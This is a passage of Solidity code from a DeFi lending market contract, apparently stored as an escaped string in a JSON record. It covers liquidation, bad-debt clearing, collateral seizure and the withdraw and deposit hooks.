position + position.mulWadDown((block.timestamp - maturity) * penaltyRate);\n            actualRepay = debt > maxAssets ? maxAssets.mulDivDown(position, debt) : maxAssets;\n\n            if (actualRepay == 0) maxAssets = 0;\n            else {\n              actualRepay = noTransferRepayAtMaturity(maturity, actualRepay, maxAssets, borrower, false);\n              maxAssets -= actualRepay;\n            }\n          }\n          repaidAssets += actualRepay;\n        }\n        packedMaturities >>= 1;\n        maturity += FixedLib.INTERVAL;\n      }\n    }\n\n    if (maxAssets != 0 && account.floatingBorrowShares != 0) {\n      uint256 borrowShares = previewRepay(maxAssets);\n      if (borrowShares != 0) {\n        (uint256 actualRepayAssets, ) = noTransferRefund(borrowShares, borrower);\n        repaidAssets += actualRepayAssets;\n      }\n    }\n\n    // reverts on failure\n    (uint256 lendersAssets, uint256 seizeAssets) = auditor.calculateSeize(this, seizeMarket, borrower, repaidAssets);\n    earningsAccumulator += lendersAssets;\n\n    if (address(seizeMarket) == address(this)) {\n      internalSeize(this, msg.sender, borrower, seizeAssets);\n    } else {\n      seizeMarket.seize(msg.sender, borrower, seizeAssets);\n\n      emitMarketUpdate();\n    }\n\n    emit Liquidate(msg.sender, borrower, repaidAssets, lendersAssets, seizeMarket, seizeAssets);\n\n    auditor.handleBadDebt(borrower);\n\n    asset.safeTransferFrom(msg.sender, address(this), repaidAssets + lendersAssets);\n  }\n\n  /// @notice Clears floating and fixed debt for an account spreading the losses to the `earningsAccumulator`.\n  /// @dev Can only be called from the auditor.\n  /// @param borrower account with insufficient collateral to be cleared the debt.\n  function clearBadDebt(address borrower) external {\n    if (msg.sender != address(auditor)) revert NotAuditor();\n\n    floatingAssets += accrueAccumulatedEarnings();\n    Account storage account = accounts[borrower];\n    uint256 accumulator = earningsAccumulator;\n    uint256 totalBadDebt = 0;\n    uint256 packedMaturities = account.fixedBorrows;\n    uint256 maturity = packedMaturities & ((1 << 32) - 1);\n    packedMaturities = packedMaturities >> 32;\n    while (packedMaturities != 0) {\n      if (packedMaturities & 1 != 0) {\n        FixedLib.Position storage position = fixedBorrowPositions[maturity][borrower];\n        uint256 badDebt = position.principal + position.fee;\n        if (accumulator >= badDebt) {\n          RewardsController memRewardsController = rewardsController;\n          if (address(memRewardsController) != address(0)) memRewardsController.handleBorrow(borrower);\n          accumulator -= badDebt;\n          totalBadDebt += badDebt;\n          floatingBackupBorrowed -= fixedPools[maturity].repay(position.principal);\n          delete fixedBorrowPositions[maturity][borrower];\n          account.fixedBorrows = account.fixedBorrows.clearMaturity(maturity);\n\n          emit RepayAtMaturity(maturity, msg.sender, borrower, badDebt, badDebt);\n        }\n      }\n      packedMaturities >>= 1;\n      maturity += FixedLib.INTERVAL;\n    }\n    if (account.floatingBorrowShares != 0 && (accumulator = previewRepay(accumulator)) != 0) {\n      (uint256 badDebt, ) = noTransferRefund(accumulator, borrower);\n      totalBadDebt += badDebt;\n    }\n    if (totalBadDebt != 0) {\n      earningsAccumulator -= totalBadDebt;\n      emit SpreadBadDebt(borrower, totalBadDebt);\n    }\n    emitMarketUpdate();\n  }\n\n  /// @notice Public function to seize a certain amount of assets.\n  /// @dev Public function for liquidator to seize borrowers assets in the floating pool.\n  /// This function will only be called from another Market, on `liquidation` calls.\n  /// That's why msg.sender needs to be passed to the internal function (to be validated as a Market).\n  /// @param liquidator address which will receive the seized assets.\n  /// @param borrower address from which the assets will be seized.\n  /// @param assets amount to be removed from borrower's possession.\n  function seize(address liquidator, address borrower, uint256 assets) external whenNotPaused {\n    internalSeize(Market(msg.sender), liquidator, borrower, assets);\n  }\n\n  /// @notice Internal function to seize a certain amount of assets.\n  /// @dev Internal function for liquidator to seize borrowers assets in the floating pool.\n  /// Will only be called from this Market on `liquidation` or through `seize` calls from another Market.\n  /// That's why msg.sender needs to be passed to the internal function (to be validated as a Market).\n  /// @param seizeMarket address which is calling the seize function (see `seize` public function).\n  /// @param liquidator address which will receive the seized assets.\n  /// @param borrower address from which the assets will be seized.\n  /// @param assets amount to be removed from borrower's possession.\n  function internalSeize(Market seizeMarket, address liquidator, address borrower, uint256 assets) internal {\n    if (assets == 0) revert ZeroWithdraw();\n\n    // reverts on failure\n    auditor.checkSeize(seizeMarket, this);\n\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleDeposit(borrower);\n    uint256 shares = previewWithdraw(assets);\n    beforeWithdraw(assets, shares);\n    _burn(borrower, shares);\n    emit Withdraw(msg.sender, liquidator, borrower, assets, shares);\n    emit Seize(liquidator, borrower, assets);\n    emitMarketUpdate();\n\n    asset.safeTransfer(liquidator, assets);\n  }\n\n  /// @notice Hook to update the floating pool average, floating pool balance and distribute earnings from accumulator.\n  /// @param assets amount of assets to be withdrawn from the floating pool.\n  function beforeWithdraw(uint256 assets, uint256) internal override whenNotPaused {\n    updateFloatingAssetsAverage();\n    depositToTreasury(updateFloatingDebt());\n    uint256 earnings = accrueAccumulatedEarnings();\n    uint256 newFloatingAssets = floatingAssets + earnings - assets;\n    // check if the underlying liquidity that the account wants to withdraw is borrowed\n    if (floatingBackupBorrowed + floatingDebt > newFloatingAssets) revert InsufficientProtocolLiquidity();\n    floatingAssets = newFloatingAssets;\n  }\n\n  /// @notice Hook to update the floating pool average, floating pool balance and distribute earnings from accumulator.\n  /// @param assets amount of assets to be deposited to the floating pool.\n  function afterDeposit(uint256 assets, uint256) internal override whenNotPaused whenNotFrozen {\n    updateFloatingAssetsAverage();\n    uint256 treasuryFee = updateFloatingDebt();\n    uint256 earnings = accrueAccumulatedEarnings();\n    floatingAssets += earnings + assets;\n    depositToTreasury(treasuryFee);\n    emitMarketUpdate();\n  }\n\n  /// @notice Withdraws the owner's floating pool assets to the receiver address.\n  /// @dev Makes sure that the owner doesn't have shortfall after withdrawing.\n  /// @param assets amount of underlying to be withdrawn.\n  /// @param receiver address to which the assets will be transferred.\n  /// @param owner address which owns the floating pool assets.\n  /// @return shares amount of shares redeemed for underlying asset.\n  function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {\n    auditor.checkShortfall(this, owner, assets);\n    RewardsController memRewardsController = rewardsController;\n    if (address(memRewardsController) != address(0)) memRewardsController.handleDeposit(owner);\n    shares = super.withdraw(assets, receiver, owner);\n    emitMarketUpdate();\n  }\n\n  /// @notice Redeems the owner's floating pool assets"
    }
  ]
}